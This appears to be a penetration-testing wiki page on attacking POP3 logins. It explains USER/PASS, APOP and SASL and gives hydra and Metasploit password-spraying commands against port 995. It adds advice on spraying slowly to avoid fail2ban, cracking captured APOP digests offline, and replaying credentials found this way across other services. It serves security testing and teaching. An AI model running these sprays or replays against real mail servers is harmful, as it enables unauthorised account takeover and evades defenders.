---
title: "Authentication: logging in and spraying POP3 credentials"
description: "Authenticating to POP3: the cleartext USER/PASS two-step, the APOP challenge-response (MD5 of the greeting timestamp plus a shared secret), SASL AUTH, and online spraying with hydra and Metasploit against 995. Reads +OK versus -ERR and explains when APOP is attackable offline."
keywords:
  - pop3 login
  - user pass
  - apop md5
  - pop3 password spray
  - hydra pop3
---

# Authentication

POP3 has three ways in. `USER name` then `PASS secret` is the cleartext default and crosses the wire in the open unless wrapped in TLS (995) or STLS. `APOP name digest` is a challenge-response: the digest is `MD5(timestamp + shared-secret)` over the token from the greeting, so the password never travels, but a captured token/digest pair is crackable offline. `AUTH <mechanism>` runs SASL (PLAIN, LOGIN, CRAM-MD5) much as IMAP does. A `+OK` after the credential step is a working login; `-ERR` is a rejection. As with any mail account the hit is almost always reusable elsewhere.

## Preconditions

Run `CAPA` and read the greeting first ([enumeration](enumeration.md)). No `STLS` on 110 and no 995 means `USER`/`PASS` is plaintext (relevant for sniffing). An APOP token in the greeting means APOP is on offer.

## Manual login

```bash
openssl s_client -connect <target>:995 -quiet
USER alice
+OK
PASS Sprint2025!
+OK Logged in.
```

The `+OK Logged in.` is a valid credential and an open session you can drive straight into [mailbox access](mailbox-access.md). `-ERR` after `PASS` is a bad password (or, on older servers, an unknown user).

## APOP

When the greeting carries `<1896.697170952@mail.corp.local>`, the APOP response for a known shared secret is the MD5 of the token concatenated with the password:

```bash
# token from the greeting, password=Sprint2025!
printf '<1896.697170952@mail.corp.local>Sprint2025!' | md5sum
# -> c4c9334bac560ecc979e58001b3e22fb  -
nc <target> 110
APOP alice c4c9334bac560ecc979e58001b3e22fb
+OK maildrop has 12 messages
```

APOP is useful two ways offensively: you can test candidate passwords against it offline if you capture a real `APOP` line (token is in the greeting, digest is on the wire), and its presence signals an older server worth fingerprinting for [server exploitation](server-exploitation.md). SASL `CRAM-MD5` behaves similarly: a captured challenge/response pair is an offline cracking target.

## Spraying

```bash
# one password across validated users, implicit TLS on 995
hydra -L users.txt -p 'Sprint2025!' -s 995 -S <target> pop3 -t 4 -f
# single account, short contextual list
hydra -l alice -P top-passwords.txt -s 995 -S <target> pop3 -t 4 -f
# Metasploit's POP3 login scanner as an alternative driver
msfconsole -qx 'use auxiliary/scanner/pop3/pop3_login; set RHOSTS <target>; set USER_FILE users.txt; set PASS_FILE pass.txt; run; exit'
```

`-S` selects implicit TLS (995); for cleartext 110 drop it. Keep threads low and the list short and contextual: POP3 servers log failures and are commonly fronted by fail2ban, so a slow spray of validated usernames with organization-derived passwords beats a broad brute force.

## Follow-on

A working credential goes to [mailbox access](mailbox-access.md) and should be replayed against IMAP, SMTP submission, webmail, VPN, and the directory immediately.

## Tools

- [hydra](https://github.com/vanhauser-thc/thc-hydra)
- [Metasploit pop3_login scanner](https://www.rapid7.com/db/modules/auxiliary/scanner/pop3/pop3_login/)

## References

- [RFC 1939: USER/PASS and APOP](https://datatracker.ietf.org/doc/html/rfc1939#section-7)
- [RFC 1734: POP3 AUTH command](https://datatracker.ietf.org/doc/html/rfc1734)
- [HackTricks: pentesting POP](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-pop.html)
